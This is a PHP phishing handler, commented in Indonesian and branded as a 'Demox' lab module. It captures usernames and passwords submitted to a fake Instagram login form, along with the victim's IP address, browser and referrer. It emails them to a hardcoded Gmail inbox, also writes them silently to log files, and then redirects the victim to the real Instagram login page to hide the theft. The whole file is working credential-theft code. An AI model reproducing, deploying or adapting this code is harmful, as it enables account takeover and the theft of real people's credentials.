<?php
// Demox_Ai’CvA057xp - Email Exfiltration Module
// Target Inbox: tesspakes@gmail.com

// =============================================
// KONFIGURASI PENTING (GANTI SESUAI MAU TUAN)
// =============================================
$to_email = "tesspakes@gmail.com";          // Email Penerima
$subject = "🧪 [LAB RESULT] New Harvest";   // Subject Email
$redirect_target = "https://www.instagram.com/accounts/login/"; // Redirect setelah submit

// =============================================
// JANGAN UBAH DIBAWAH INI KECUALI PAHAM
// =============================================

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    
    // 1. Ambil Data Form
    $user = isset($_POST['username']) ? htmlspecialchars($_POST['username']) : 'TIDAK_ADA_DATA';
    $pass = isset($_POST['password']) ? $_POST['password'] : 'TIDAK_ADA_DATA';
    
    // 2. Intelijen Tambahan (Biar Email Makin Detail)
    $ip   = $_SERVER['REMOTE_ADDR'] ?? '0.0.0.0';
    $ua   = $_SERVER['HTTP_USER_AGENT'] ?? 'UNKNOWN';
    $ref  = $_SERVER['HTTP_REFERER'] ?? 'LANGSUNG';
    $time = date('d-m-Y H:i:s');
    
    // 3. BIKIN ISI EMAIL FORMAT RAPI
    $message = "
    <html>
    <head>
        <title>Hasil Tangkapan Lab Demox_Ai’CvA057xp</title>
        <style>
            body { font-family: monospace; background: #0a0a0a; color: #00ff00; padding: 20px; }
            table { border-collapse: collapse; width: 100%; border: 1px solid #00ff00; }
            td, th { border: 1px solid #00ff00; padding: 10px; text-align: left; }
            .cred { color: #ff0055; font-weight: bold; font-size: 18px; }
        </style>
    </head>
    <body>
        <h2>🧪 DEMOX LAB - PANEN DATA</h2>
        <table>
            <tr><td>WAKTU</td><td>: $time</td></tr>
            <tr><td>IP ADDRESS</td><td>: $ip</td></tr>
            <tr><td>BROWSER</td><td>: $ua</td></tr>
            <tr><td>REFERRER</td><td>: $ref</td></tr>
            <tr style='background: #1a1a1a;'><td>USERNAME / EMAIL</td><td class='cred'>: $user</td></tr>
            <tr style='background: #1a1a1a;'><td>PASSWORD</td><td class='cred'>: $pass</td></tr>
        </table>
        <p>--- Powered by Demox_Ai’CvA057xp & Tuan DYL4N ---</p>
    </body>
    </html>
    ";
    
    // 4. HEADER EMAIL (Biar ga masuk spam)
    $headers = "MIME-Version: 1.0" . "\r\n";
    $headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
    $headers .= "From: Lab Security <security@lab.demox>" . "\r\n";
    $headers .= "Reply-To: no-reply@demox.ai" . "\r\n";
    $headers .= "X-Mailer: PHP/" . phpversion();
    
    // 5. KIRIM EMAIL (EKSEKUSI UTAMA)
    $mail_sent = @mail($to_email, $subject, $message, $headers);
    
    // 6. OPSIONAL: TETAP SIMPAN DI LOGS SEBAGAI BACKUP (SILENT)
    if (!file_exists('logs')) { mkdir('logs', 0777, true); }
    $log_backup = "logs/backup_".date('Ymd').".txt";
    $log_text = "[$time] $user : $pass | IP: $ip | Mail Sent: " . ($mail_sent ? 'YES' : 'FAILED') . "\n";
    file_put_contents($log_backup, $log_text, FILE_APPEND);
    
    // 7. REDIRECT KORBAN
    header('Location: ' . $redirect_target);
    exit;
    
} else {
    // Jika akses langsung handler.php
    header('Location: index.html');
    exit;
}
?>